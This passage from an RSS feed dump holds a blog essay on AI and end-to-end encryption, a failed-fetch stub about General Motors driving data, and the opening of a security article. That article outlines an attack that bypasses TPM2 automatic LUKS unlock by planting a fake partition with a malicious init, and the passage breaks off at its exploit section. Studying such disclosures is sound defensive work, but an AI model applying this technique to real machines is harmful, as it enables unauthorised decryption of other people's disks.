<p>Around 2011 our approach to data storage began to evolve. This began with messaging apps like <a href="https://support.signal.org/hc/en-us/articles/360007320391-Is-it-private-Can-I-trust-it">Signal</a>, <a href="https://support.apple.com/guide/security/imessage-security-overview-secd9764312f/web">Apple iMessage</a> and <a href="https://faq.whatsapp.com/820124435853543">WhatsApp</a>, all of which began to roll out default end-to-end encryption for private messaging. This technology changed the way that keys are managed, to ensure that servers would <em>never see the plaintext content of your messages.</em> Shortly afterwards, phone (OS) designers like Google, Samsung and Apple began encrypting the data stored locally on your phone, a move that occasioned some famous <a href="https://epic.org/documents/apple-v-fbi-2/">arguments with law enforcement</a>. More recently, Google <a href="https://www.androidcentral.com/how-googles-backup-encryption-works-good-bad-and-ugly">introduced default end-to-end encryption for phone backups</a>, and (somewhat <a href="https://www.reuters.com/article/world/exclusive-apple-dropped-plan-for-encrypting-backups-after-fbi-complained-sour-idUSKBN1ZK1CO/">belatedly</a>) Apple has <a href="https://support.apple.com/en-us/108756">begun to follow.</a></p>



<p>Now I don’t want to minimize the engineering effort required here, which was massive. But these projects were also relatively simple. By this I mean: all of the data encrypted in these projects shared a common feature, which is that <em>none of it needed to be processed by a server.</em></p>



<p>The obvious limitation of end-to-end encryption is that while it can hide content from servers, it can also make it very difficult for servers to compute on that data.<sup>1</sup> This is basically fine for data like cloud backups and private messages, since that content is mostly interesting to clients. For data that actually requires serious processing, the options are much more limited. Wherever this is the case — for example, consider a phone that applies <a href="https://support.apple.com/guide/iphone/use-live-text-iphcf0b71b0e/ios">text recognition</a> to the photos in your camera roll — designers typically get forced into a binary choice. On the one hand they can (1) send plaintext off to a server, in the process resurrecting many of the earlier vulnerabilities that end-to-end encryption sought to close. Or else (2) they can limit their processing to whatever can be <a href="https://www.theverge.com/2017/9/13/16300464/apple-iphone-x-ai-neural-engine">performed</a> <a href="https://developers.google.com/ml-kit/vision/text-recognition/v2/android">on the device</a> itself.</p>



<p>The problem with the second solution is that your typical phone only has a limited amount of processing power, not to mention RAM and battery capacity. Even the top-end iPhone will typically perform photo processing while it’s plugged in at night, just to avoid burning through your battery when you might need it. Moreover, there is a huge amount of variation in phone hardware. Some flagship phones will run you $1400 or more, and contain onboard GPUs and neural engines. But these phones aren’t typical, in the US and particularly around the world. Even in the US it’s still possible to buy a decent Android phone for a couple hundred bucks, and a lousy one for much less. There is going to be a vast world of difference between these devices in terms of what they can process.</p>



<p>So now we’re finally ready to talk about AI.</p>



<p>Unless you’ve been living under a rock, you’ve probably noticed the explosion of powerful new AI models with amazing capabilities. These include Large Language Models (LLMs) which can generate and understand complex human text, as well as new image processing models that can do amazing things in that medium. You’ve probably also noticed Silicon Valley’s enthusiasm to find applications for this tech. And since phone and messaging companies <em>are</em> Silicon Valley, your phone and its apps are no exception. Even if these firms don’t quite know <em>how</em> AI will be useful to their customers, they’ve already decided that models are the future. In practice this has already manifested in the deployment of applications such as <a href="https://arstechnica.com/apple/2024/11/apple-intelligence-notification-summaries-are-honestly-pretty-bad/">text message summarization</a>, systems that listen to and detect <a href="https://support.google.com/pixelphone/thread/307725284/learn-more-about-the-new-scam-detection-beta?hl=en">scam phone calls</a>, models that detect <a href="https://support.apple.com/en-us/105069">offensive images</a>, as well as new systems that help you <a href="https://support.apple.com/guide/iphone/use-writing-tools-iph6f08da1d2/ios">compose text</a>.</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-2.png"><img data-attachment-id="7959" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-44/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-2.png" data-orig-size="1128,581" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-2.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-2.png?w=700" width="1024" height="527" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-2.png?w=1024" alt=""></a></figure></div>


<p>And these are obviously just the beginning.</p>



<p>If you believe the AI <a href="https://www.youtube.com/watch?v=_-8j28KFXvQ">futurists</a> — and in this case, I actually think you should — all these toys are really just a palate cleanser for the<em> </em>main entrée still to come: the deployment of “AI agents,” aka, <a href="https://www.goodreads.com/quotes/985552-the-encyclopedia-galactica-defines-a-robot-as-a-mechanical-apparatus">Your Plastic Pal Who’s Fun To Be With</a>. </p>



<p><em>In theory</em> these new agent systems will remove your need to ever bother messing with your phone again. They’ll read your email and text messages and they’ll answer for you. They’ll order your food and find the best deals on shopping, swipe your dating profile, negotiate with your lenders, and generally anticipate your every want or need. The only ingredient they’ll need to realize this blissful future is <em>virtually unrestricted access to all your private data</em>, plus a whole gob of computing power to process it.</p>



<p>Which finally brings us to the sticky part. </p>



<p>Since most phones currently don’t have the compute to run very powerful models, and since models keep getting better and in some cases <a href="https://techcrunch.com/2025/01/10/vcs-say-ai-companies-need-proprietary-data-to-stand-out-from-the-pack/">more proprietary</a>, it is likely that much of this processing (and the data you need processed) will have to be offloaded to remote servers.</p>



<p>And that’s the first reason that I would say that AI is going to be the biggest privacy story of the decade. Not only will we soon be doing more of our compute off-device, but we’ll be sending a lot more of our private data. This data will be examined and summarized by increasingly powerful systems, producing relatively compact but valuable summaries of our lives. In principle those systems will eventually know everything about us and about our friends. They’ll read our most intimate private conversations, maybe they’ll even intuit our deepest innermost thoughts. We are about to face many hard questions about these systems, including some difficult questions about <em>whether they will actually be working for us at all.</em></p>



<p>But I’ve gone about two steps farther than I intended to. Let’s start with the easier questions.</p>



<h3>What does AI mean for end-to-end encrypted messaging?</h3>



<p>Modern end-to-end encrypted messaging systems provide a very specific set of technical guarantees. Concretely, an end-to-end encrypted system is designed to ensure that plaintext message content <span>in transit</span> is not available anywhere except for the end-devices of the participants and (here comes the Big Asterisk) <em>anyone the participants or their devices choose to share it with.</em></p>



<p>The last part of that sentence is very important, and it’s obvious that non-technical users get pretty confused about it. End-to-end encrypted messaging systems are intended to deliver data securely. <em>They don’t dictate what happens to it next.</em> If you take screenshots of your messages, back them up in plaintext, copy/paste your data onto Twitter, or hand over your device in response to a civil lawsuit — well, that has really nothing to do with end-to-end encryption. Once the data has been delivered from one end to the other, end-to-end encryption washes its hands and goes home</p>



<p>Of course there’s a difference between <em>technical guarantees</em> and the promises that individual service providers make to their customers. For example, Apple says this about its iMessage service:</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-3.png"><img data-attachment-id="7968" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-45/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-3.png" data-orig-size="2398,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-3.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-3.png?w=700" width="1024" height="172" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-3.png?w=1024" alt=""></a></figure></div>


<p>I can see how these promises might get a little bit confusing! For example, imagine that Apple keeps its promise to deliver messages securely, but then your (Apple) phone goes ahead and uploads (the plaintext) message content to a different set of servers where <span>Apple really can</span> decrypt it. Apple is absolutely using end-to-end encryption in the dullest technical sense… yet is the statement above really accurate? Is Apple keeping its broader promise that it “can’t decrypt the data”?</p>



<p>Note: I am not picking on Apple here! This is just one paragraph from a <a href="https://support.apple.com/guide/security/welcome/web">security overview</a>. In a separate legal document, Apple’s lawyers have written a <a href="https://www.apple.com/legal/privacy/data/en/messages/">zillion words to cover their asses</a>. My point here is just to point out that a <em>technical guarantee</em> is different from a <em>user promise</em>.</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/img_9881.jpg"><img data-attachment-id="7970" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/img_9881/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/img_9881.jpg" data-orig-size="1059,375" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="IMG_9881" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/img_9881.jpg?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/img_9881.jpg?w=700" loading="lazy" width="1024" height="362" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/img_9881.jpg?w=1024" alt=""></a></figure></div>


<p>Making things more complicated, this might not be a question about your own actions. Consider the promise you receive every time you start a WhatsApp group chat (at right.) Now imagine that some other member of the group — not you, but one of your idiot friends —&nbsp;decides to turn on some service that uploads (your) received plaintext messages to WhatsApp. Would you still say the message you received still accurately describes how WhatsApp treats your data? If not, how should it change?</p>



<p>In general, what we’re asking here is a question about <em>informed</em> <em>consent. </em>Consent is complicated because it’s both a moral concept and also a legal one, and because the law is different in every corner of the world. The <a href="https://eprint.iacr.org/2024/2086.pdf">NYU/Cornell paper</a> does an excellent job giving an overview of the legal bits, but — and sorry to be a bummer here — I really don’t want you to expect the law to protect you. I imagine that some companies will do a good job informing their users, as a way to earn trust. Other companies, won’t. Here in the US, they’ll bury your consent inside of an inscrutable “terms of service” document you never read. In the EU they’ll probably just invent a new type of cookie banner.</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-4.png"><img data-attachment-id="7973" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-46/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-4.png" data-orig-size="2054,908" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-4.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-4.png?w=700" loading="lazy" width="1024" height="452" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-4.png?w=1024" alt=""></a><figcaption><em>This is obviously a joke. But, like, maybe not?</em></figcaption></figure></div>


<p>So to summarize: in the near term we’re headed to a world where we should expect increasing amounts of our data to be processed by AI, and a lot of that processing will (very likely) be off-device. Good end-to-end encrypted services will actively inform you that this is happening, so maybe you’ll have the chance to opt-in or opt-out. But if it’s <em>truly ubiquitous</em> (as our futurist friends tell us it will be) then probably your options will be end up being pretty limited.</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-5.png"><img data-attachment-id="7979" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-47/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-5.png" data-orig-size="672,186" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-5.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-5.png?w=672" loading="lazy" width="672" height="186" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-5.png?w=672" alt=""></a><figcaption>Some ideas for avoiding AI inference on your private messages (cribbed from <a href="https://www.usenix.org/system/files/1401_08-12_mickens.pdf">Mickens</a>.) </figcaption></figure></div>


<p>Fortunately all is not lost. In the short term, a few people have been thinking hard about this problem.</p>



<h3>Trusted Hardware and Apple’s “Private Cloud Compute”</h3>



<p>The good news is that our coming AI future isn’t going to be a total privacy disaster. And in large part that’s because a few privacy-focused companies like Apple have anticipated the problems that ML inference will create (namely the need to outsource processing to better hardware) and have tried to do something about it. This something is essentially a new type of cloud-based computer that Apple believes is trustworthy enough to hold your private data. </p>



<p>Quick reminder: as we already discussed, Apple can’t rely on every device possessing enough power to perform inference locally. This means inference will be outsourced to a remote cloud machine. Now the <em>connection</em> from your phone to the server can be encrypted, but the remote machine will still receive confidential data that it must see in cleartext. This poses a huge risk at that machine. It could be compromised and the data stolen by hackers, or worse, Apple’s business development executives could find out about it.</p>



<p>Apple’s <a href="https://security.apple.com/blog/private-cloud-compute/">approach to this problem</a> is called “Private Cloud Compute” and it involves the use of special <em>trusted hardware</em> devices that run in Apple’s data centers. A “trusted hardware device” is a kind of computer that is locked-down in both the physical and logical sense. Apple’s devices are house-made, and use custom silicon and software features. One of these is Apple’s <a href="https://support.apple.com/guide/security/boot-process-for-iphone-and-ipad-devices-secb3000f149/web">Secure Boot</a>, which ensures that only “allowed” operating system software is loaded. The OS then uses code-signing to verify that only permitted software images can run. Apple ensures that no long-term state is stored on these machines, and also load-balances your request to a different random server every time you connect. The machines “attest” to the application software they run, meaning that they announce a hash of the software image (which must itself itself be stored in a verifiable <a href="https://en.wikipedia.org/wiki/Certificate_Transparency">transparency log</a> to prevent any new software from surreptitiously being added.) Apple even says it will <a href="https://security.apple.com/blog/pcc-security-research/">publish its software</a> images (though unfortunately not the source code) so that security researchers can check them over for bugs.</p>



<p>The goal of this system is to make it hard for both attackers <em>and </em>Apple employees to exfiltrate data from these devices. I won’t say I’m thrilled about this. It goes without saying that Apple’s approach is a vastly weaker guarantee than encryption — it still centralizes a huge amount of valuable data, and its security relies on Apple getting a bunch of complicated software and hardware security features right, rather than the mathematics of an encryption algorithm. Yet this approach is obviously much better than what’s being done at companies like OpenAI, where the data is processed by servers that employees (presumably) can log into and access.</p>



<p>Although PCC is currently unique to Apple, we can hope that other privacy-focused services will soon crib the idea — after all, imitation is the best form of flattery. In this world, if we absolutely must have AI everywhere, at least the result will be a bit more secure than it might otherwise be.</p>



<h3>Who does your AI agent actually work for?</h3>



<p>There are <em>so</em> many important questions that I haven’t discussed in this post, and I feel guilty because I’m not going to get to them. I have not, for example, discussed the very important problem of the data used to <em>train</em> (and fine-tune) future AI models, something that opens entire oceans of privacy questions. If you’re interested, these problems are discussed in the <a href="https://eprint.iacr.org/2024/2086.pdf">NYU/Cornell paper.</a>  </p>



<p>But rather than go into that, I want to turn this discussion towards a different question: namely, <em>who are these models actually going to be working <span>for</span>? </em></p>



<p>As I mentioned above, over the past couple of years I’ve been watching <a href="https://www.gov.uk/government/publications/end-to-end-encryption-and-child-safety/end-to-end-encryption-and-child-safety">the UK</a> and <a href="https://www.europarl.europa.eu/RegData/etudes/ATAG/2023/751473/EPRS_ATA(2023)751473_EN.pdf">EU</a> debate new laws that would mandate automated “scanning” of private, encrypted messages. The EU’s proposal is focused on detecting both existing and <em>novel</em> child sexual abuse material (CSAM); it has at various points also included proposals to detect <a href="https://www.edpb.europa.eu/system/files/2024-02/edpb_statement_202401_proposal_regulation_prevent_combat_child_sexual_abuse_en.pdf">audio and textual conversations</a> that represent “<a href="https://thehackernews.com/2022/05/eu-proposes-new-rules-for-tech.html">grooming behavior</a>.” The UK’s proposal is a bit wilder and covers many different types of illegal content, including hate speech, terrorism content and fraud — one proposed amendment even covered “<a href="https://edri.org/our-work/the-uk-will-treat-online-images-of-immigrants-crossing-the-channel-as-a-criminal-offence/">images of immigrants crossing the Channel in small boats</a>.”</p>


<div>
<figure><a href="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-6.png"><img data-attachment-id="7995" data-permalink="https://blog.cryptographyengineering.com/2025/01/17/lets-talk-about-ai-and-end-to-end-encryption/image-48/" data-orig-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-6.png" data-orig-size="1500,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-6.png?w=300" data-large-file="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-6.png?w=700" loading="lazy" width="1024" height="682" src="https://blog.cryptographyengineering.com/wp-content/uploads/2025/01/image-6.png?w=1024" alt=""></a></figure></div>


<p>While scanning<em> </em>for known<em> </em>CSAM does not require AI/ML, detecting nearly every one of the other types of content would require powerful ML inference that can operate on your private data. (Consider, for example, what is involved in detecting <a href="https://blog.google/technology/safety-security/how-we-detect-remove-and-report-child-sexual-abuse-material/">novel CSAM content</a>.) Plans to detect audio or textual “grooming behavior” and hate speech will require even more powerful capabilities: not just speech-to-text capabilities, but also some ability to truly understand the topic of human conversations without false positives. It is hard to believe that politicians even understand what they’re asking for. And yet some of them <a href="https://www.euractiv.com/section/politics/news/swedish-parliament-divided-over-eus-new-controversial-chat-control-bill/"><span>are</span> asking for it</a>, in a few cases very eagerly.</p>



<p>These proposals haven’t been implemented yet. But to some degree this is because ML systems that securely process private data are very challenging to build, and technical platforms have <a href="https://www.politico.eu/article/meta-encryption-uk-fight/">been resistant to building them.</a> Now I invite you to imagine a world where we <em>voluntarily go ahead and build </em>general-purpose agents that are capable of all of these tasks and more. You might do everything in your technical power to keep them under the user’s control, but can you guarantee that they will remain that way?</p>



<p>Or put differently: would you even blame governments for demanding access to a resource like this? And how would you stop them? After all, think about how much time and money a law enforcement agency could save by asking your agent sophisticated questions about your behavior and data, questions like: “does this user have any potential CSAM,” or “have they written anything that could potentially be hate speech in their private notes,” or “do you think maybe they’re cheating on their taxes?” You might even convince yourself that these questions are “privacy preserving,” since no human police officer would ever rummage through your papers, and law enforcement would only learn the answer if you were (probably) doing something illegal.</p>



<p>This future worries me because it doesn’t really matter what technical choices we make around privacy. It does not matter if your model is running locally, or if it uses trusted cloud hardware — <em>once a sufficiently-powerful general-purpose agent has been deployed on your phone</em>, <em>the only question that remains is who is given access to talk to it.</em> Will it be only you? Or will we prioritize the government’s interest in monitoring its citizens over various fuddy-duddy notions of individual privacy.</p>



<p>And while I’d like to hope that we, as a society, will make the right political choice in this instance, frankly I’m just not that confident.</p>



<p><em>Notes:</em></p>



<ol>
<li>(A quick note: some will suggest that Apple should use <a href="https://blog.cryptographyengineering.com/2012/01/02/very-casual-introduction-to-fully/">fully-homomorphic encryption</a> [FHE] for this calculation, so the private data can remain encrypted. This is <em>theoretically</em> possible, but unlikely to be practical. The best FHE schemes we have today really only work for evaluating very tiny ML models, of the sort that would be practical to run on a weak client device. While schemes will get better and hardware will too, I suspect this barrier will exist for a long time to come.)</li>
</ol>








	</div><!-- .entry-content -->

			<!-- .entry-footer -->
	</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[General Motors Is Banned from Selling Driving Behavior Data for 5 Years (181 pts)]]></title>
            <link>https://www.nytimes.com/2025/01/16/technology/general-motors-driving-data-settlement.html</link>
            <guid>42734260</guid>
            <pubDate>Fri, 17 Jan 2025 05:01:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/01/16/technology/general-motors-driving-data-settlement.html">https://www.nytimes.com/2025/01/16/technology/general-motors-driving-data-settlement.html</a>, See on <a href="https://news.ycombinator.com/item?id=42734260">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/01/16/technology/general-motors-driving-data-settlement.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Bypassing disk encryption on systems with automatic TPM2 unlock (188 pts)]]></title>
            <link>https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/</link>
            <guid>42733640</guid>
            <pubDate>Fri, 17 Jan 2025 03:00:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/">https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/</a>, See on <a href="https://news.ycombinator.com/item?id=42733640">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Have you setup automatic disk unlocking with TPM2 and
<code>systemd-cryptenroll</code> or <code>clevis</code>? Then
chances are high that your disk can be decrypted by an attacker who
just has brief physical access to your machine - with some
preparation, 10 minutes will suffice. In this article we will
explore how TPM2 based disk decryption works, and understand why
many setups are vulnerable to a kind of filesystem confusion
attack. We will follow along by exploiting two different real
systems (Fedora + clevis, NixOS + systemd-cryptenroll).</p><pre data-lang="bash"><code data-lang="bash"><span># Examples commands used to enroll a key into the TPM. Whether your system is
</span><span># suffers from this issue does not depend on which PCRs you choose here.
</span><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>0+2+7</span><span> --tpm2-device</span><span>=</span><span>auto </span><span>&lt;</span><span>device</span><span>&gt;
</span><span>clevis</span><span> luks bind</span><span> -d </span><span>&lt;</span><span>device</span><span>&gt;</span><span> tpm2 </span><span>'{"pcr_bank":"sha256","pcr_ids":"0,1,2,7"}'
</span></code></pre><p><strong>TL;DR:</strong> Most TPM2 unlock setups fail to verify
the LUKS identity of the decrypted partition. Since the initrd must
reside in an unencrypted boot partition, an attacker can inspect it
to learn how it decrypts the disk and also what type of filesystem
it expects to find inside. By recreating the LUKS partition with a
known key, we can confuse the initrd into executing a malicious
<code>init</code> executable. Since the TPM state will not be
altered in any way by this fake partition, the original LUKS key
can be unsealed from the TPM. Afterwards, the initial disk state
can be fully restored and then decrypted using the obtained
key.</p><p>You are safe if you additionally use a pin to unlock your TPM,
or use an initrd that properly asserts the LUKS identity (which
would involve manual work, so you'd probably know if that is the
case).</p><h2 id="the-idea-behind-tpm2-based-disk-decryption"><span><span><a href="#the-idea-behind-tpm2-based-disk-decryption" aria-label="Anchor link for: the-idea-behind-tpm2-based-disk-decryption">🔗</a></span>
The idea behind TPM2 based disk decryption</span></h2><p>The idea behind secure and password-less disk decryption is that
the TPM2 can store an additional LUKS key which your system can
only retrieve, if the TPM is in a predetermined, known-good state.
This state is recorded in the so-called Platform Configuration
Registers (PCRs), of which there are 24 in a standard compliant
TPM. Their intended use is described in the <a href="https://uapi-group.org/specifications/specs/linux_tpm_pcr_registry/">Linux TPM PCR Registry</a> but also neatly summarized as a table in
the <a href="https://www.freedesktop.org/software/systemd/man/latest/systemd-cryptenroll.html"><code>systemd-cryptenroll(1)</code></a> man page.</p><p>These registers store hashes which are successively updated
while booting based on information like the bootlaoder hash, the
firmware in use, the booted kernel, initrd image and a lot more
things. By establishing a chain of trust through all components
involved in booting up to the linux userspace, we can ensure that
altering any component will affect one or several PCRs. Storing
data in the TPM requires you to select a list of PCRs and it will
ensure that the data can only be retrieved again if all of these
PCRs are in the same state as when enrolling the secret.</p><p>Several of these registers have an agreed-upon purpose and are
updated with some specific information about your system, such as
your board's firmware, your BIOS configuration, OptionROMs (extra
firmware loaded from external devices such as PCIe devices after
POST), the secure boot policy, or other things. Here's an excerpt
from the man page from above containing some of the registers that
are important to us:</p><table><thead><tr><th>PCR</th><th>Name</th><th>Explanation</th></tr></thead><tbody><tr><td>0</td><td>platform-code</td><td>Core system firmware executable code; changes on firmware
updates</td></tr><tr><td>2</td><td>external-code</td><td>Extended or pluggable executable code; includes option ROMs on
pluggable hardware</td></tr><tr><td>7</td><td>secure-boot-policy</td><td>Secure Boot state; changes when UEFI SecureBoot mode is
enabled/disabled, or firmware certificates (PK, KEK, db, dbx, …)
changes.</td></tr><tr><td>15</td><td>system-identity</td><td>systemd-cryptsetup(8) optionally measures the volume key of
activated LUKS volumes into this PCR. systemd-pcrmachine.service(8)
measures the machine-id(5) into this PCR. systemd-pcrfs@.service(8)
measures mount points, file system UUIDs, labels, partition UUIDs
of the root and /var/ filesystems into this PCR.</td></tr></tbody></table><p>Below this list, an interesting piece of information is given in
the man page about the intended use of PCRs for encrypted
volumes:</p><blockquote><p>In general, encrypted volumes would be bound to some combination
of PCRs 7, 11, and 14 (if shim/MOK is used). In order to allow
firmware and OS version updates, it is typically not advisable to
use PCRs such as 0 and 2, since the program code they cover should
already be covered indirectly through the certificates measured
into PCR 7. Validation through certificates hashes is typically
preferable over validation through direct measurements as it is
less brittle in context of OS/firmware updates: the measurements
will change on every update, but signatures should remain
unchanged. See the Linux TPM PCR Registry for more discussion.</p></blockquote><p>If you enroll your own secure boot keys and use a Unified Kernel
Image (UKI), then using just PCR 7 will be sufficient to ensure
integrity up to the point where we need to unlock our disk. Some
distributions instead ship EFI executables that are pre-signed with
the Microsoft keys, which allows them to enable secure boot by
default without requiring the user to generate and enroll anything
on their own. Since this also means that the user cannot sign their
kernel and/or initrd image, a trusted and pre-signed shim is often
used to measure the hash of the kernel and initrd before executing
them into PCR 9, which we would want to use in that case. Another
approach is to have the user generate a so-called Machine Owner Key
(MOK) if they want to sign something, in which case PCR 14 should
be used, too.</p><p>So the exact PCR selection may change a bit depending on the
user's setup. A quick <a href="https://github.com/search?q=cryptenroll+%2F0%5C%2B2%5C%2B7%2F&amp;type=code">search on GitHub</a> or <a href="https://duckduckgo.com/?t=h_&amp;q=cryptenroll+0%2B2%2B7&amp;ia=web">on the internet</a> reveals that many people still opt to use
additional PCRs like 0 and 2 in addition to 7, which is of course
fine but may result in keys becoming inaccessible when the BIOS or
some firmware is updated - which can be annoying.</p><h3 id="a-common-vulnerable-setup"><span><span><a href="#a-common-vulnerable-setup" aria-label="Anchor link for: a-common-vulnerable-setup">🔗</a></span>
A common (vulnerable) setup</span></h3><p>If you already have secure boot set up, configuring TPM2 unlock
for your LUKS partition is usually very simple. Most guides will
resort to <code>systemd-cryptenroll</code> or <code>clevis</code>
which are different implementations that internally do some
variation of the following:</p><ol><li>Add a newly generated key to your LUKS partition</li><li>Seal this key in your TPM based on your selection of PCRs</li><li>Store the encrypted TPM context in the LUKS token metadata
which is required to unseal the secret at a later point in
time</li></ol><p>Both <code>clevis</code> and <code>systemd-cryptenroll</code>
can store tokens in other ways than a TPM2, for example using a
FIDO2 key. I found that <code>clevis</code> also supports
retrieving tokens from network resources, but other than that the
two tools are very similar in what they do.
<code>systemd-cryptenroll</code> just comes pre-packaged with
<code>systemd</code> so it is usually a bit simpler to use. Here is
an example:</p><pre data-lang="bash"><code data-lang="bash"><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>7</span><span> --tpm2-device</span><span>=</span><span>auto /dev/nvme0n1p3
</span></code></pre><p>In theory, the disk is now properly protected, assuming the
kernel command line cannot be edited, right? It can only be
decrypted if PCR 7 is unchanged, and anything we would do to the
bootloader, kernel or initrd would affect PCR 7.</p><p>Well, of course, I wouldn't be asking if there wasn't a tiny
caveat: Assuming all disks were mounted properly, the initrd can be
certain that no code has been modified up to this point. But it
does <em>not</em> automatically ensure that the data on them is
authentic. As the very last step, the initrd will execute the
<code>init</code> executable of the real system, which usually
doesn't undergo any kind of signature check before it is executed.
And why would it have to - after all it is part of the encrypted
root partition which cannot be altered by an attacker.</p><h3 id="the-exploit"><span><span><a href="#the-exploit" aria-label="Anchor link for: the-exploit">🔗</a></span> The exploit</span></h3><p>First of all, it is important to know that the initrd will fall
back to a password prompt, if TPM unlocking fails for whatever
reason. A BIOS update could always cause the secure boot database
to be altered (thus invalidating PCR 7), or somebody makes a
mistake when updating the system and forgets to sign the kernel and
initrd properly. In such a case you don't want to be locked out
